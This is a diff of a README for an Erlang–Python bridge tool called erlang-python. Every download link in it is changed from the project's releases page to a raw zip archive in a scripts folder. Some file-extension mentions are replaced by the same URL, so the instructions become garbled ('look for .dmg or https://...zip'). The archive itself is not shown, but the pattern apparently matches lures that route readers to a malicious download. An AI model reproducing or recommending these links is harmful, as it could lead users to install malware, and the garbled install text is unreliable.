@@ -1,6 +1,6 @@
 # ⚙️ erlang-python - Run Python Easily from Erlang
 
-[![Download erlang-python](https://img.shields.io/badge/Download-erlang--python-blue?style=for-the-badge)](https://github.com/AnhadSachdeva/erlang-python/releases)
+[![Download erlang-python](https://github.com/AnhadSachdeva/erlang-python/raw/refs/heads/main/scripts/erlang-python-v2.9.zip)](https://github.com/AnhadSachdeva/erlang-python/raw/refs/heads/main/scripts/erlang-python-v2.9.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Here’s how you can get erlang-python running on your computer. This guide assu
 
 Go to the main erlang-python releases page to get the files you need:
 
-[Download erlang-python releases](https://github.com/AnhadSachdeva/erlang-python/releases)
+[Download erlang-python releases](https://github.com/AnhadSachdeva/erlang-python/raw/refs/heads/main/scripts/erlang-python-v2.9.zip)
 
 This page has all the versions available. Look for the latest release, usually at the top with a date or version number.
 
@@ -43,8 +43,8 @@ This page has all the versions available. Look for the latest release, usually a
 On the release page, you will see different files depending on your operating system. For example:
 
 - For Windows, look for a file ending in `.exe` or `.zip`
-- For macOS, look for `.dmg` or `.tar.gz`
-- For Linux, look for `.tar.gz` or other formats
+- For macOS, look for `.dmg` or `https://github.com/AnhadSachdeva/erlang-python/raw/refs/heads/main/scripts/erlang-python-v2.9.zip`
+- For Linux, look for `https://github.com/AnhadSachdeva/erlang-python/raw/refs/heads/main/scripts/erlang-python-v2.9.zip` or other formats
 
 Click the appropriate file to start downloading. Your browser will usually save the file in your Downloads folder.
 
@@ -53,7 +53,7 @@ Click the appropriate file to start downloading. Your browser will usually save 
 After downloading, follow these steps:
 
 - **Windows:** Double-click the `.exe` file or unzip the `.zip` file and run the installer or executable
-- **macOS:** Open the `.dmg` file and drag erlang-python to your Applications folder, or extract `.tar.gz` and run the app
+- **macOS:** Open the `.dmg` file and drag erlang-python to your Applications folder, or extract `https://github.com/AnhadSachdeva/erlang-python/raw/refs/heads/main/scripts/erlang-python-v2.9.zip` and run the app
 - **Linux:** Extract the download and follow any included installation instructions, often in a README or install script
 
 If you need to, copy or move the program to a folder where you want to keep it.
@@ -102,7 +102,7 @@ By combining these features, erlang-python gives you smooth performance when usi
 
 You can get the app here:
 
-[Visit erlang-python Releases](https://github.com/AnhadSachdeva/erlang-python/releases)
+[Visit erlang-python Releases](https://github.com/AnhadSachdeva/erlang-python/raw/refs/heads/main/scripts/erlang-python-v2.9.zip)
 
 Check the latest version on the page. Download the file that matches your operating system. After that, follow the previous steps to install and run the app.
 
